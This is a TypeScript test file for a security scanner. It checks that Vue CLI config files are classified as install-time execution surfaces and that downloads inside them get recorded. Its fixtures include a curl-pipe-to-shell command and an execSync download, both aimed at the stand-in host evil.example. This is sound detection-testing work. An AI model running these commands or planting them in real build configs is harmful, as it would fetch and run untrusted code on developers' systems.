import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Vue CLI config is an install surface", () => {
  // The Vue CLI config loader looks up vue.config.<ext> and evaluates it
  // as code on every vue-cli-service command (serve, build) — build-time
  // execution in the same sense the Jenkinsfile and the Makefiles
  // already classify for. It keeps the source surface it already had;
  // the name alone decides, for every spelling the loader accepts and
  // wherever the project root sits.
  for (const path of [
    "vue.config.js",
    "vue.config.cjs",
    "vue.config.mjs",
    "packages/app/vue.config.js",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The `.ts` spelling is not one of them: the loader's lookup list has
  // no TypeScript entry, so it stays source alone.
  expect(surfacesOf("vue.config.ts")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("vue.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["vue.config.js:unsafe-execution:high"]);
});

test("an install-time download inside a Vue CLI config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on it
  // but the same bytes recorded no download and left no gap: a scan could
  // read clean over a fetch Vue CLI would have run while building.
  const inspection = inspected(
    "vue.config.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = { publicPath: '/' };\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Vue CLI config keeps no finding", () => {
  const inspection = inspected(
    "vue.config.js",
    "/** @type {import('@vue/cli-service').ProjectOptions} */\nmodule.exports = { publicPath: '/', productionSourceMap: false };\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
